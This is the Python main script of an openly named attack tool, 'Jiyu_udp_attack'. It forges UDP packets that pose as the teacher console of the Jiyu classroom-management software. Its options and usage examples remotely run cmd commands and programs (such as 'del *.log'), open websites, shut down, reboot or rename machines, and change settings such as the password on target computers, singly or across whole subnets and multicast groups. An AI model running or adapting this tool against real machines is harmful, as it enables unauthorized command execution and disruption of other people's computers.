"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import argparse
import binascii
import shlex

import sys
from typing import Any, List, Sequence, cast

try:
    from arg_display import MaxWidthHelpFormatter, ModeOptionalAction
    from sender import broadcast_packet
    from packet import (
        pkg_close_top_window,
        pkg_close_windows,
        pkg_message,
        pkg_shutdown,
        pkg_rename,
        pkg_website,
        pkg_execute,
        pkg_setting,
        pkg_customize,
    )
except ImportError:
    from Jiyu_udp_attack.arg_display import MaxWidthHelpFormatter, ModeOptionalAction
    from Jiyu_udp_attack.sender import broadcast_packet
    from Jiyu_udp_attack.packet import (
        pkg_close_top_window,
        pkg_close_windows,
        pkg_message,
        pkg_shutdown,
        pkg_rename,
        pkg_website,
        pkg_execute,
        pkg_setting,
        pkg_customize,
    )


def main_parser():
    """
    Main parser for the Jiyu attack script.
    This function sets up the command-line argument parser with various options for network configuration and attack actions
    """
    parser = argparse.ArgumentParser(
        prog="Jiyu_udp_attack",
        description="Jiyu Attack Script\n\n"
        "Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ \n",
        epilog="Example usage:\n"
        '    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"\n'
        "    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com\n"
        '    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
        "    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe\n"
        "    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
        '    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
        '    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
        "    python Jiyu_udp_attack -t 192.168.106.255 -cw\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 -ctw\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
        "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
        "    python Jiyu_udp_attack -t 127.0.0.1 --setting",
        formatter_class=MaxWidthHelpFormatter,
    )
    network_config_group = parser.add_argument_group(
        "Network Configuration", "Specify the network configuration for the attack."
    )
    network_config_group.add_argument(
        "-f",
        "--teacher-ip",
        type=str,
        metavar="<ip>",
        default=None,
        help="Teacher's IP address",
    )
    network_config_group.add_argument(
        "-fp",
        "--teacher-port",
        type=int,
        metavar="<port>",
        default=None,
        help="Teacher's port (default to random port)",
    )
    network_config_group.add_argument(
        "-t",
        "--target",
        type=str,
        metavar="<ip>",
        nargs="*",
        help="Target IP address",
    )
    network_config_group.add_argument(
        "-tp",
        "--target-port",
        type=int,
        metavar="<port>",
        default=4705,
        help="Port to send packets to (default: 4705)",
    )
    network_config_group.add_argument(
        "-i",
        "--ip-id",
        type=int,
        metavar="<ip_id>",
        default=None,
        help="IP ID for the packet (default: random ID)",
    )

    attack_action_group = parser.add_argument_group(
        "Attack Action", "Specify the action to perform on the target machine. "
    )
    attack_action = attack_action_group.add_mutually_exclusive_group()
    attack_action.add_argument(
        "-m",
        "--message",
        type=str,
        metavar="<msg>",
        help="Send a message to the target machine",
    )
    attack_action.add_argument(
        "-w",
        "--website",
        type=str,
        metavar="<url>",
        help="Open a website on the target machine",
    )
    attack_action.add_argument(
        "-c",
        "--command",
        type=str,
        metavar="<command>",
        help="Execute a command on the target machine\n(`cmd /D /C <command>`, Windows only)",
    )
    attack_action.add_argument(
        "-e",
        "--execute",
        nargs="+",
        default=None,
        action=ModeOptionalAction,
        modes=("minimize", "maximize"),
        metavar=("<program>", "<args>"),
        help="Execute a program with arguments on the target machine",
    )
    attack_action.add_argument(
        "-s",
        "--shutdown",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Shutdown the target machine,\noptionally with a timeout and message",
    )
    attack_action.add_argument(
        "-r",
        "--reboot",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Reboot the target machine,\noptionally with a timeout and message",
    )
    attack_action.add_argument(
        "-cw",
        "--close-windows",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Close all windows on the target machine",
    )
    attack_action.add_argument(
        "-ctw",
        "--close-top-window",
        action="store_true",
        help="Close the top window on the target machine",
    )
    attack_action.add_argument(
        "-n",
        "--rename",
        nargs=2,
        metavar=("<name>", "<name_id>"),
        help="Rename the target machine",
    )
    attack_action.add_argument(
        "--setting",
        nargs="?",
        metavar="<setting-args>",
        const="--help",
        help="Set specific settings on the target machine\nUse `Jiyu_udp_attack --setting` for help",
    )
    attack_action.add_argument(
        "--hex",
        type=str,
        metavar="<hex_data>",
        help="Send raw hex data to the target machine",
    )
    attack_action.add_argument(
        "--pkg",
        nargs="+",
        metavar=("<custom_data>", "<args>"),
        help="Custom packet data to send",
    )
    return parser


def setting_parser():
    """
    Parser for the --setting argument.
    This function is currently a placeholder and can be expanded in the future.
    """
    parser = argparse.ArgumentParser(
        description="Specify settings for the target machine",
        usage='Jiyu_udp_attack <main-args> --setting="[setting-options]"',
        argument_default=argparse.SUPPRESS,
        epilog="Example usage:\n"
        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting=""\n'
        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
        formatter_class=MaxWidthHelpFormatter,
    )
    network = parser.add_argument_group("Network Configuration")
    network.add_argument(
        "--network",
        default=False,
        action="store_true",
        help="Configure network settings on the target machine",
    )
    network.add_argument(
        "--transmission_reliability",
        type=str,
        metavar="<reliability>",
        choices=("low", "medium", "high"),
        default="medium",
        help="Set the transmission reliability level (default: medium)",
    )
    network.add_argument(
        "--offline-lag-time-detection",
        type=int,
        metavar="<time_ms>",
        default=10,
        help="Set the offline lag time detection threshold in seconds (default: 10 ms)",
    )

    audio = parser.add_argument_group("Audio Configuration")
    audio.add_argument(
        "--audio",
        default=False,
        action="store_true",
        help="Configure audio settings on the target machine",
    )
    audio.add_argument(
        "--playback-mute",
        default=False,
        action="store_true",
        help="Mute audio playback on the target machine",
    )
    audio.add_argument(
        "--recording-mute",
        default=False,
        action="store_true",
        help="Mute audio recording on the target machine",
    )
    audio.add_argument(
        "--playback-volume",
        type=int,
        metavar="<volume>",
        default=80,
        help="Set the audio playback volume (default: 80)",
    )
    audio.add_argument(
        "--recording-volume",
        type=int,
        metavar="<volume>",
        default=80,
        help="Set the audio recording volume (default: 80)",
    )

    password = parser.add_argument_group("Password Configuration")
    password.add_argument(
        "--password",
        default=False,
        action="store_true",
        help="Configure password settings on the target machine",
    )
    password.add_argument(
        "--password-value",
        type=str,
        metavar="<password>",
        default="",
        help="Set the password for the target machine (default: empty)",
    )

    other = parser.add_argument_group("Other Settings")
    other.add_argument(
        "--preventing-process-termination",
        type=str,
        choices=("disable", "enable", "auto"),
        default="auto",
        help="Set the process termination prevention mode (default: auto)",
    )
    other.add_argument(
        "--lock-screen-when-maliciously-offline",
        type=str,
        choices=("disable", "enable", "auto"),
        default="auto",
        help="Set the lock screen mode when maliciously offline (default: auto)",
    )
    other.add_argument(
        "--hide-the-setup-name-button",
        type=str,
        choices=("disable", "enable", "auto"),
        default="auto",
        help="Set the visibility of the setup name button (default: auto)",
    )

    return parser


def main():
    """Main function to parse arguments and execute the attack."""
    logger: List[Any] = []

    parser = main_parser()
    args = parser.parse_args()
    teacher_ip = args.teacher_ip
    teacher_port = args.teacher_port
    targets = args.target
    port = args.target_port

    logger.append(args)

    try:
        if args.message:
            payload = pkg_message(args.message)
        elif args.website:
            payload = pkg_website(args.website)
        elif args.command:
            payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
        elif args.close_top_window:
            payload = pkg_close_top_window()
        elif args.execute:
            if len(args.execute) != 2:
                parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
            else:
                mode, args_list = args.execute
                args_list = cast(Sequence[str], args_list)
                if len(args_list) == 1:
                    program, args_list = args_list[0], ""
                elif len(args_list) == 2:
                    program, args_list = args_list
                else:
                    parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
            payload = pkg_execute(
                program, args_list, "normal" if mode is None else mode  # pylint: disable=E0601, E0606
            )
        elif args.shutdown is not None:
            if len(args.shutdown) == 0:
                payload = pkg_shutdown()
            elif len(args.shutdown) == 1:
                payload = pkg_shutdown(timeout=int(args.shutdown[0]))
            elif len(args.shutdown) == 2:
                payload = pkg_shutdown(timeout=int(args.shutdown[0]), message=args.shutdown[1])
            else:
                parser.error("Invalid shutdown arguments: expected [timeout] or [timeout, message]")
        elif args.reboot is not None:
            if len(args.reboot) == 0:
                payload = pkg_shutdown(reboot=True)
            elif len(args.reboot) == 1:
                payload = pkg_shutdown(timeout=int(args.reboot[0]), reboot=True)
            elif len(args.reboot) == 2:
                payload = pkg_shutdown(timeout=int(args.reboot[0]), message=args.reboot[1], reboot=True)
            else:
                parser.error("Invalid reboot arguments: expected [timeout] or [timeout, message]")
        elif args.close_windows is not None:
            if len(args.close_windows) == 0:
                payload = pkg_close_windows()
            elif len(args.close_windows) == 1:
                payload = pkg_close_windows(timeout=int(args.close_windows[0]))
            elif len(args.close_windows) == 2:
                payload = pkg_close_windows(timeout=int(args.close_windows[0]), message=args.close_windows[1])
            else:
                parser.error("Invalid close windows arguments: expected [timeout] or [timeout, message]")
        elif args.rename:
            name, name_id = args.rename
            payload = pkg_rename(name, int(name_id))
        elif args.setting is not None:
            parser2 = setting_parser()
            setting_args = parser2.parse_args(shlex.split(args.setting))
            payload = pkg_setting(**dict(setting_args._get_kwargs()))  # pylint: disable=protected-access
            logger.append(setting_args)  # Store parsed settings for debugging
        elif args.hex:
            payload = binascii.unhexlify(args.hex.replace(" ", ""))
        elif args.pkg:
            format_str, *user_args = args.pkg
            if not format_str.startswith(":"):
                with open(format_str, "r", encoding="utf-8") as f:
                    format_str = f.read().strip()
            else:
                format_str = format_str[1:]  # Remove leading ':'
            payload = pkg_customize(format_str, *user_args)
        else:
            parser.error("At least one attack action must be specified. Use -h for help.")

        if targets is None:
            parser.error("Target IP address must be specified. Use -h for help.")
        if len(targets) == 0:
            parser.error("Target IP address cannot be empty. Use -h for help.")

        print(*logger, sep="\n\n", end="\n\n")

        for target in targets:
            for dest in broadcast_packet(
                teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id  # pylint: disable=E0601, E0606
            ):
                print(f"Sent packet with a length of {len(payload)} to {dest[0]}:{dest[1]}")
    except Exception as e:  # pylint: disable=broad-except
        parser.error(f"({e.__class__.__name__}) {e}")


if __name__ == "__main__":
    main()
else:
    print("This script is intended to be run as a standalone program, not imported as a module.", file=sys.stderr)
    print("Please run it directly using 'python Jiyu_udp_attack/__main__.py' or similar command.", file=sys.stderr)
    raise ImportError("This script is not designed to be imported as a module.")
